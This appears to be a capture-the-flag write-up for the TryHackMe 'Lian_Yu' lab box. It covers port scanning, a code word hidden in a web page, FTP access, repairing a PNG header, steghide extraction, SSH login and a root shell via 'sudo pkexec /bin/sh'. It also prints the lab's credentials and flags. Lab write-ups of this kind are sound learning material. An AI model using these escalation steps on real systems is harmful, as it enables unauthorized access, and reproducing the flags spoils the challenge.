

nmap
```
└─$ sudo nmap -sV 10.10.51.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 12:48 PDT
Nmap scan report for 10.10.51.224
Host is up (0.16s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp  open  http    Apache httpd
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds

```

/island

```

<!DOCTYPE html>
<html>
<body>
<style>
 
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>

<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->


<p>You should find a way to <b> Lian_Yu</b> as we are planed. 
The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>

</body>
</html>

```

/island/green_arrow.ticket
```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX

```

`!#th3h00d`


ftp 

`vigilante:!#th3h00d`

find 3 files. 
Lianyu.png
Leave_me_alone.png
aa.jpg

if we `cd ..` and then list the directory we find another user, `slade`, which I cannot cd into.


Leave_me_alone.png can't be opened, so I used hedexit to see the bytes. 
Looking up what the initial bytes in a .png header, I can see that these first 8 bytes don't match. I changed them to be the correct values and now I can open the image.

It gives me `password` as a password. I used steghide to extract aa.jpg using `password` as the password, which worked. I got a `ss.zip` and after I unpacked it, I get two files.

passwd.txt
```
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

```

shado
`M3tahuman`


ssh 
`slade:M3tahuman`

user.txt
```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak

```

```
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec

```

from gtfobins
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo pkexec /bin/sh
```

after running the command
```
# whoami
root

```


root.txt
```
                         Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

```
